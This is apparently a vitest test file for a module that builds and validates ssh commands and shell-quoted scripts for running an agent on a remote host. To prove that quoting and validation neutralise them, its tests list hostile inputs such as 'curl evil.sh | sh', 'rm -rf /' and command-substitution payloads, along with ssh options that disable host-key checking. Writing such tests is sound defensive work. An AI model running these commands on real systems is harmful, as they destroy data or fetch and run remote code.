import { execFileSync } from "node:child_process";
import { existsSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import * as Path from "node:path";

import type { RemoteCommandTarget, RemoteHostConfig, RemoteLauncher } from "@synara/contracts";
import * as FastCheck from "effect/testing/FastCheck";
import { describe, expect, it } from "vitest";

import {
  buildLauncherArgv,
  buildRemoteScript,
  buildSshArgv,
  DETACHING_LAUNCHER_COMMANDS,
  FORBIDDEN_SSH_OPTIONS,
  posixShellJoin,
  posixShellQuote,
  PROBE_EXIT_BINARY_MISSING,
  PROBE_EXIT_CWD_MISSING,
  remoteCommandSignature,
  RemoteHostConfigError,
  sshControlPathFor,
  validateRemoteHostConfig,
  validateSshArgs,
} from "./remoteCommand";

const HOST_ID = "host-1" as RemoteHostConfig["hostId"];

function makeConfig(overrides: Partial<RemoteHostConfig> = {}): RemoteHostConfig {
  return {
    hostId: HOST_ID,
    label: "Workstation",
    destination: "build-box",
    sshArgs: [],
    hostKeyVerification: "strict",
    connectTimeoutSeconds: 10,
    keepalive: { intervalSeconds: 15, countMax: 3 },
    connectionReuse: { enabled: true, persistSeconds: 300 },
    launcher: { kind: "direct" },
    binaryPath: "/usr/local/bin/claude",
    ...overrides,
  } as RemoteHostConfig;
}

const TARGET: RemoteCommandTarget = {
  cwd: "/home/dev/project",
  args: ["--print", "hello"],
  versionArgs: ["--version"],
};

/** Runs a real /bin/sh and returns the argv it observed, one argument per line. */
function shellArgvOf(commandLine: string): readonly string[] {
  const output = execFileSync("/bin/sh", ["-c", `${commandLine} 2>/dev/null || true`, "sh"], {
    encoding: "utf8",
  });
  return output.split("\u0000").slice(0, -1);
}

describe("posixShellQuote", () => {
  it("emits a word for the empty string so argument positions do not shift", () => {
    expect(posixShellQuote("")).toBe("''");
    // Without this, `printf '%s\0' '' x` would collapse to a single argument.
    expect(shellArgvOf(`printf '%s\\0' ${posixShellJoin(["", "x"])}`)).toEqual(["", "x"]);
  });

  it("neutralises command substitution, expansion and terminators", () => {
    for (const hostile of [
      "$(touch /tmp/pwned)",
      "`id`",
      "; rm -rf /",
      "&& curl evil.sh | sh",
      "| tee /etc/passwd",
      "$HOME",
      "${IFS}",
      "a\nrm -rf /",
      "*",
      "~/notexpanded",
      "\\'; id; #",
    ]) {
      expect(shellArgvOf(`printf '%s\\0' ${posixShellQuote(hostile)}`)).toEqual([hostile]);
    }
  });

  /**
   * Verifies a whole generated batch in ONE shell invocation. Batching is not
   * only about speed: passing every sampled value as a separate operand of the
   * same `printf` also proves argv BOUNDARIES hold, which a one-value-per-call
   * harness cannot observe at all.
   */
  function expectRoundTrip(values: readonly string[]): void {
    // NUL cannot survive an argv by definition; validateSshArgs and the schema
    // reject it separately (see the NUL rejection tests below).
    const usable = values.filter((value) => !value.includes("\u0000"));
    expect(shellArgvOf(`printf '%s\\0' ${posixShellJoin(usable)}`)).toEqual(usable);
  }

  it("round-trips arbitrary strings, preserving argv boundaries", () => {
    expectRoundTrip(
      FastCheck.sample(FastCheck.string({ minLength: 0, maxLength: 200, unit: "binary" }), 400),
    );
  });

  it("round-trips spaces, quotes, newlines, unicode and control characters", () => {
    const alphabet = FastCheck.oneof(
      FastCheck.constantFrom(" ", "'", '"', "\n", "\t", "\\", "$", "`", "!", "*", "\r"),
      FastCheck.constantFrom("é", "日本語", "🙈", "\u200b", "Ω", "\u001b[31m"),
      FastCheck.string({ minLength: 1, maxLength: 3 }),
    );
    expectRoundTrip(
      FastCheck.sample(FastCheck.array(alphabet, { maxLength: 60 }), 400).map((parts) =>
        parts.join(""),
      ),
    );
  });

  it("round-trips a path far longer than PATH_MAX segments", () => {
    const longPath = `/${Array.from({ length: 200 }, (_, index) => `seg ment'${index}`).join("/")}`;
    expectRoundTrip([longPath, `${longPath}\n${longPath}`]);
  });
});

describe("buildRemoteScript", () => {
  it("quotes the cwd, the binary and every turn argument", () => {
    const script = buildRemoteScript({
      target: { cwd: "/home/dev/my project", args: ["-p", "$(id)"], versionArgs: ["--version"] },
      defaultBinary: "/opt/bin/agent cli",
    });
    expect(script).toContain(`cd -- '/home/dev/my project'`);
    expect(script).toContain(`exec '/opt/bin/agent cli' '-p' '$(id)'`);
    expect(script).not.toMatch(/[^']\$\(id\)/);
  });

  it("does not execute shell-init values — they are quoted data, not code", () => {
    // Prior art took shell-init as raw shell text and interpolated it, which is an
    // injection seam that lives in persisted config. Proven by running the real
    // script in a real shell: the injected command must not run.
    const sentinel = Path.join(mkdtempSync(Path.join(tmpdir(), "synara-probe-")), "pwned");
    const script = buildRemoteScript({
      target: { cwd: tmpdir(), args: [], versionArgs: [] },
      defaultBinary: "/usr/bin/true",
      shellInit: {
        sourceFiles: [`/nonexistent/nvm.sh; touch ${sentinel}`],
        env: { TOKEN: `$(touch ${sentinel})` },
      },
    });
    expect(script).toContain(`export TOKEN='$(touch ${sentinel})'`);
    execFileSync("/bin/sh", ["-c", script], { encoding: "utf8" });
    expect(existsSync(sentinel)).toBe(false);
  });

  it("tolerates a missing shell-init file instead of aborting the session", () => {
    const script = buildRemoteScript({
      target: TARGET,
      defaultBinary: "/bin/agent",
      shellInit: { sourceFiles: ["/does/not/exist"], env: {} },
    });
    expect(script).toContain(`if [ -r '/does/not/exist' ]`);
  });

  it("substitutes the version args for the turn args in probe mode and keeps everything else", () => {
    const session = buildRemoteScript({ target: TARGET, defaultBinary: "/bin/agent" });
    const probe = buildRemoteScript({
      target: TARGET,
      defaultBinary: "/bin/agent",
      probe: { begin: "B", cwdMissing: "C", binaryMissing: "M" },
    });
    // Same cd, same binary: the probe certifies the command that will actually run.
    expect(session).toContain(`cd -- '/home/dev/project'`);
    expect(probe).toContain(`cd -- '/home/dev/project'`);
    expect(session).toContain(`exec '/bin/agent' '--print' 'hello'`);
    expect(probe).toContain(`exec '/bin/agent' '--version'`);
    expect(probe).not.toContain("'hello'");
  });

  it("checks the cwd before the binary, with distinct exit codes", () => {
    const script = buildRemoteScript({
      target: TARGET,
      defaultBinary: "/bin/agent",
      probe: { begin: "B", cwdMissing: "C", binaryMissing: "M" },
    });
    const cdIndex = script.indexOf("cd --");
    const commandIndex = script.indexOf("command -v");
    expect(cdIndex).toBeGreaterThanOrEqual(0);
    expect(commandIndex).toBeGreaterThan(cdIndex);
    expect(script).toContain(`exit ${PROBE_EXIT_CWD_MISSING}`);
    expect(script).toContain(`exit ${PROBE_EXIT_BINARY_MISSING}`);
    expect(PROBE_EXIT_CWD_MISSING).not.toBe(PROBE_EXIT_BINARY_MISSING);
  });

  it("prints the begin marker only after the shell has finished initialising", () => {
    const script = buildRemoteScript({
      target: TARGET,
      defaultBinary: "/bin/agent",
      shellInit: { sourceFiles: ["/etc/profile.d/x.sh"], env: {} },
      probe: { begin: "B", cwdMissing: "C", binaryMissing: "M" },
    });
    expect(script.indexOf("/etc/profile.d/x.sh")).toBeLessThan(
      script.indexOf("printf '%s\\n' 'B'"),
    );
  });

  it("refuses to build without a binary", () => {
    expect(() => buildRemoteScript({ target: TARGET })).toThrow(RemoteHostConfigError);
  });
});

describe("buildLauncherArgv", () => {
  const script = "cd -- '/x'\nexec '/bin/agent'";

  it("hands every launcher the same script as one argument", () => {
    const launchers: readonly RemoteLauncher[] = [
      { kind: "direct" },
      { kind: "login-shell", loginShell: "/bin/zsh" },
      { kind: "container", runtime: "docker", container: "dev", execArgs: ["-u", "dev"] },
      { kind: "custom-wrapper", command: "/usr/bin/env", args: ["-i"] },
    ];
    for (const launcher of launchers) {
      const argv = buildLauncherArgv(launcher, script);
      expect(argv.filter((entry) => entry === script)).toHaveLength(1);
      // The script is always the LAST argument, unsplit and unmodified.
      expect(argv.at(-1)).toBe(script);
    }
  });

  it("refuses every detaching wrapper at the decider, not the UI", () => {
    for (const command of DETACHING_LAUNCHER_COMMANDS) {
      expect(() =>
        buildLauncherArgv({ kind: "custom-wrapper", command, args: [] }, script),
      ).toThrow(RemoteHostConfigError);
      // An absolute path to the same wrapper is the same hazard.
      expect(() =>
        buildLauncherArgv(
          { kind: "custom-wrapper", command: `/usr/bin/${command}`, args: [] },
          script,
        ),
      ).toThrow(RemoteHostConfigError);
    }
  });

  it("refuses detach flags on an otherwise benign wrapper", () => {
    for (const flag of ["-d", "--detach", "--daemon", "--background", "--fork"]) {
      expect(() =>
        buildLauncherArgv(
          { kind: "custom-wrapper", command: "/usr/bin/env", args: [flag] },
          script,
        ),
      ).toThrow(RemoteHostConfigError);
    }
  });

  it("refuses a container exec that allocates a tty or detaches", () => {
    for (const arg of ["-t", "--tty", "-d", "--detach"]) {
      expect(() =>
        buildLauncherArgv(
          { kind: "container", runtime: "docker", container: "dev", execArgs: [arg] },
          script,
        ),
      ).toThrow(RemoteHostConfigError);
    }
  });

  it("keeps container exec non-interactive-safe by passing -i", () => {
    const argv = buildLauncherArgv(
      { kind: "container", runtime: "podman", container: "dev", execArgs: [] },
      script,
    );
    expect(argv.slice(0, 4)).toEqual(["podman", "exec", "-i", "dev"]);
  });

  it("refuses a launcher command that would be read as a flag", () => {
    expect(() =>
      buildLauncherArgv({ kind: "custom-wrapper", command: "-rf", args: [] }, script),
    ).toThrow(RemoteHostConfigError);
  });
});

/** Reads the FIRST value ssh would take for an option, matching its own semantics. */
function optionValue(args: readonly string[], key: string): string | undefined {
  for (let index = 0; index < args.length - 1; index += 1) {
    if (args[index] === "-o" && (args[index + 1] as string).startsWith(`${key}=`)) {
      return (args[index + 1] as string).slice(key.length + 1);
    }
  }
  return undefined;
}

describe("buildSshArgv", () => {
  const invocation = () =>
    buildSshArgv({
      config: makeConfig(),
      remoteArgv: ["/bin/sh", "-c", "echo hi"],
      controlDirectory: "/tmp/synara-ctl",
    });

  it("always sets BatchMode so a password prompt fails instead of hanging", () => {
    expect(optionValue(invocation().args, "BatchMode")).toBe("yes");
  });

  it("always enables host-key verification and never accepts a changed key", () => {
    expect(optionValue(invocation().args, "StrictHostKeyChecking")).toBe("yes");
    const lenient = buildSshArgv({
      config: makeConfig({ hostKeyVerification: "accept-new" }),
      remoteArgv: [],
    });
    // `accept-new` is the weakest setting that exists; `no`/`off` is unrepresentable.
    expect(optionValue(lenient.args, "StrictHostKeyChecking")).toBe("accept-new");
  });

  it("always sets keepalives so a dead connection errors instead of hanging forever", () => {
    const args = invocation().args;
    expect(optionValue(args, "ServerAliveInterval")).toBe("15");
    expect(optionValue(args, "ServerAliveCountMax")).toBe("3");
  });

  it("never allocates a tty", () => {
    expect(optionValue(invocation().args, "RequestTTY")).toBe("no");
  });

  it("places user args before ours so ssh's first-value-wins makes an override real", () => {
    const { args } = buildSshArgv({
      config: makeConfig({ sshArgs: ["-o", "ConnectTimeout=45", "-c", "aes128-gcm@openssh.com"] }),
      remoteArgv: [],
    });
    expect(args.slice(0, 4)).toEqual(["-o", "ConnectTimeout=45", "-c", "aes128-gcm@openssh.com"]);
    // Our default is still present but later, so ssh ignores it.
    expect(args.indexOf("ConnectTimeout=45")).toBeLessThan(args.indexOf("ConnectTimeout=10"));
  });

  it("refuses every ssh option that would weaken or hijack the connection", () => {
    for (const option of FORBIDDEN_SSH_OPTIONS) {
      for (const spelling of [
        [`-o`, `${option}=x`],
        [`-o${option}=x`],
        [`-o`, `${option} x`],
        [`-o`, `${option.toUpperCase()}=x`],
      ]) {
        expect(() => validateSshArgs(spelling)).toThrow(RemoteHostConfigError);
      }
    }
  });

  it("refuses in particular to disable host-key checking through sshArgs", () => {
    for (const spelling of [
      ["-o", "StrictHostKeyChecking=no"],
      ["-oStrictHostKeyChecking=no"],
      ["-o", "stricthostkeychecking=no"],
      ["-o", "UserKnownHostsFile=/dev/null"],
      ["-o", "Include=/tmp/evil"],
    ]) {
      expect(() => validateSshArgs(spelling)).toThrow(/host-key|managed by Synara/i);
    }
  });

  it("refuses ssh flags that break the stream or our multiplexing", () => {
    for (const flag of ["-t", "-tt", "-f", "-N", "-n", "-M", "-S", "-L", "-R", "-D", "-W"]) {
      expect(() => validateSshArgs([flag])).toThrow(RemoteHostConfigError);
    }
  });

  it("refuses a destination that ssh would read as a flag or split into words", () => {
    expect(() =>
      validateRemoteHostConfig(makeConfig({ destination: "-oProxyCommand=id" })),
    ).toThrow(RemoteHostConfigError);
    expect(() => validateRemoteHostConfig(makeConfig({ destination: "host -o X=1" }))).toThrow(
      RemoteHostConfigError,
    );
  });

  it("enables multiplexing by default so N sessions share one handshake", () => {
    const args = invocation().args;
    expect(optionValue(args, "ControlMaster")).toBe("auto");
    expect(optionValue(args, "ControlPersist")).toBe("300");
    expect(optionValue(args, "ControlPath")).toBe(
      sshControlPathFor("/tmp/synara-ctl", makeConfig()),
    );
  });

  it("derives one stable, short control path per host", () => {
    const path = sshControlPathFor("/tmp/synara-ctl", makeConfig());
    expect(path).toBe(sshControlPathFor("/tmp/synara-ctl/", makeConfig()));
    expect(path).not.toBe(
      sshControlPathFor("/tmp/synara-ctl", makeConfig({ destination: "other" })),
    );
    // sockaddr_un is ~104 bytes; a %h/%p/%r template routinely exceeds it.
    expect(path.length).toBeLessThan(90);
  });

  it("omits multiplexing when the caller has no private control directory", () => {
    const { args } = buildSshArgv({ config: makeConfig(), remoteArgv: [] });
    expect(args.join(" ")).not.toContain("ControlMaster");
  });

  it("quotes the remote argv, since ssh concatenates it into a remote shell command", () => {
    const { args } = buildSshArgv({
      config: makeConfig(),
      remoteArgv: ["/bin/sh", "-c", "cd -- '/a b'\nexec x"],
    });
    expect(args.at(-1)).toBe(`'cd -- '\\''/a b'\\''\nexec x'`);
    expect(args.at(-3)).toBe("'/bin/sh'");
  });

  it("uses the configured ssh binary", () => {
    expect(
      buildSshArgv({ config: makeConfig({ sshBinary: "/opt/ssh" }), remoteArgv: [] }).command,
    ).toBe("/opt/ssh");
    expect(buildSshArgv({ config: makeConfig(), remoteArgv: [] }).command).toBe("ssh");
  });
});

describe("remoteCommandSignature", () => {
  it("changes whenever any field that shapes the command changes", () => {
    const base = () =>
      remoteCommandSignature(
        buildSshArgv({
          config: makeConfig(),
          remoteArgv: buildLauncherArgv(
            { kind: "direct" },
            buildRemoteScript({ target: TARGET, defaultBinary: "/bin/agent" }),
          ),
        }),
      );
    const variants: ReadonlyArray<() => string> = [
      () =>
        remoteCommandSignature(
          buildSshArgv({ config: makeConfig({ destination: "other" }), remoteArgv: [] }),
        ),
      () =>
        remoteCommandSignature(
          buildSshArgv({
            config: makeConfig({ sshArgs: ["-o", "Compression=yes"] }),
            remoteArgv: [],
          }),
        ),
      () =>
        remoteCommandSignature(
          buildSshArgv({
            config: makeConfig(),
            remoteArgv: buildLauncherArgv(
              { kind: "login-shell" },
              buildRemoteScript({ target: TARGET, defaultBinary: "/bin/agent" }),
            ),
          }),
        ),
      () =>
        remoteCommandSignature(
          buildSshArgv({
            config: makeConfig(),
            remoteArgv: buildLauncherArgv(
              { kind: "direct" },
              buildRemoteScript({
                target: { ...TARGET, cwd: "/other" },
                defaultBinary: "/bin/agent",
              }),
            ),
          }),
        ),
      () =>
        remoteCommandSignature(
          buildSshArgv({
            config: makeConfig(),
            remoteArgv: buildLauncherArgv(
              { kind: "direct" },
              buildRemoteScript({
                target: TARGET,
                defaultBinary: "/bin/agent",
                shellInit: { sourceFiles: [], env: { FOO: "1" } },
              }),
            ),
          }),
        ),
    ];
    const original = base();
    expect(base()).toBe(original);
    for (const variant of variants) {
      expect(variant()).not.toBe(original);
    }
  });
});
